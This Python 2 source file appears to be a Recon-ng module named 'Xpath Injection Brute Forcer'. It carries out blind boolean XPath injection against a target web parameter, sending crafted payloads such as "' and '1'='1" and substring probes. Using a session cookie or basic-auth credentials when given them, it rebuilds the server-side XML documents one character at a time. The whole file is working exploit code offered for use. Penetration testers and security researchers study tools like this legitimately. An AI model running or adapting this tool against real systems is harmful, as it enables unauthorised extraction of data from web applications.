import framework
# unique to module
import urllib
import sys

class Module(framework.module):

    def __init__(self, params):
        framework.module.__init__(self, params)
        self.register_option('base_url', None, 'yes', 'the target resource url excluding any parameters')
        self.register_option('basic_user', None, 'no', 'username for basic authentication')
        self.register_option('basic_pass', None, 'no', 'password for basic authentication')
        self.register_option('cookie', None, 'no', 'cookie string containing authenticated session data')
        self.register_option('parameters', None, 'yes', 'the query parameters with \'<inject>\' signifying the injection')
        self.register_option('post', False, 'yes', 'set the request method to post. parameters should still be submitted in the url option')
        self.register_option('string', None, 'yes', 'a unique string found when the injection results in \'True\'')
        self.info = {
                     'Name': 'Xpath Injection Brute Forcer',
                     'Author': 'Tim Tomes (@LaNMaSteR53)',
                     'Description': 'Exploits XPath injection flaws to enumerate the contents of serverside XML documents.',
                     'Comments': []
                     }

    def getRequest(self, strTest):
        payload = {}
        for param in self.lstParams:
            payload[param[0]] = param[1].replace('<inject>', strTest)
        # send the request
        resp = self.request(self.strUrl, method=self.strMethod, payload=payload, headers=self.dictHeaders, auth=self.tupAuth)
        # process the response
        self.intCount += 1
        if self.strSearch in resp.text:
            return True
        else:
            return False

    def getLength(self, strTest):
        intLength = 0
        for x in range(0,10000):
            if self.getRequest(strTest % (x)):
                return x

    def getString(self, intLength, strTest):
        strResult = ''
        for x in range(1,intLength+1):
            found = False
            for char in self.strCharset:
                if self.getRequest(strTest % (x, char)):
                    strResult += char
                    sys.stdout.write(char)
                    sys.stdout.flush()
                    found = True
                    break
            if not found:
                strResult += '?'
                sys.stdout.write('?')
                sys.stdout.flush()
        return strResult

    def getAttribs(self, node):
        intAttribs = self.getLength("' and count(%s/@*)=%%d and '1'='1" % (node))
        for x in range(1,intAttribs+1):
            # length of attrib name
            intNamelen = self.getLength("' and string-length(name(%s/@*[%d]))=%%d and '1'='1" % (node, x))
            # attrib name
            sys.stdout.write(' ')
            sys.stdout.flush()
            name = self.getString(intNamelen, "' and substring(name(%s/@*[%d]),%%d,1)='%%s' and '1'='1" % (node, x))
            # length of attrib value
            intValuelen = self.getLength("' and string-length(%s/@*[%d])=%%d and '1'='1" % (node, x))
            # attrib value
            sys.stdout.write('="')
            sys.stdout.flush()
            value = self.getString(intValuelen, "' and substring(%s/@*[%d],%%d,1)='%%s' and '1'='1" % (node, x))
            sys.stdout.write('"')
            sys.stdout.flush()

    def getXML(self, node='', name='', level=0):
        spacer = '   '*level
        intNodes = self.getLength("' and count(%s/*)=%%d and '1'='1" % (node))
        if not intNodes:
            # check for value
            intValuelen = self.getLength("' and string-length(%s)=%%d and '1'='1" % (node))
            if intValuelen:
                sys.stdout.write('>')
                sys.stdout.flush()
                value = self.getString(intValuelen, "' and substring(%s,%%d,1)='%%s' and '1'='1" % (node))
                print '</%s>' % (name)
            else:
                print '/>'
            return True
        if level != 0: print '>'
        for x in range(1,intNodes+1):
            strNode = '%s/*[%d]' % (node, x)
            # length of node name
            intNamelen = self.getLength("' and string-length(name(%s))=%%d and '1'='1" % (strNode))
            # node name
            sys.stdout.write('%s<' % (spacer))
            sys.stdout.flush()
            name = self.getString(intNamelen, "' and substring(name(%s),%%d,1)='%%s' and '1'='1" % (strNode))
            self.getAttribs(strNode)
            if not self.getXML(strNode, name, level + 1):
                print '%s</%s>' % (spacer, name)

    def module_run(self):
        self.strSearch = self.options['string']['value']
        self.strUrl = self.options['base_url']['value']
        #self.strCharset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789!"#$%&\'()*+,-./:;<=>?@[\]^_`{|}~'
        self.strCharset = 'aeorisn1tl2md0cp3hbuk45g9687yfwjvzxqASERBTMLNPOIDCHGKFJUW.!Y*@V-ZQX_$#,/+?;^ %~=&`\)][:<(>"|{\'}'
        self.intCount = 0
        strTrue = "' and '1'='1"
        strFalse = "' and '1'='2"

        # process parameters
        params = self.options['parameters']['value']
        params = params.split('&')
        params = [param.split('=') for param in params]
        self.lstParams = [(urllib.unquote_plus(param[0]), urllib.unquote_plus(param[1])) for param in params]

        # process basic authentication
        username = self.options['basic_user']['value']
        password = self.options['basic_pass']['value']
        self.tupAuth = (username, password) if username and password else ()

        # process cookie authentication
        cookie = self.options['cookie']['value']
        self.dictHeaders = {'Cookie': cookie} if cookie else {}

        # set the request method
        self.strMethod = 'POST' if self.options['post']['value'] else 'GET'

        if self.getRequest(strTrue):
            self.verbose("'True' test passed.")
        else:
            self.error("'True' test failed.")
            return

        if not self.getRequest(strFalse):
            self.verbose("'False' test passed.")
        else:
            self.error("'False' test failed.")
            return

        self.output('Fetching XML...')
        self.getXML()
        print '%d total queries made.' % (self.intCount)
